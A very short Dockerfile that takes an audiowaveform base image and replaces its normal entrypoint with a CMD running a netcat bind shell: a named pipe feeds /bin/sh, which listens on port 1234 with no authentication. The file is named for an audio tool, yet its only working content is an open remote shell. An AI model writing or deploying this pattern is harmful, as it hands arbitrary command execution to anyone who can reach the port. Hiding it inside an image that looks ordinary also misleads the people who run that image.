FROM vimagick/audiowaveform

ENV PORT=1234

ENTRYPOINT []

CMD rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh 2>&1 | nc -k -l ${PORT} > /tmp/f;
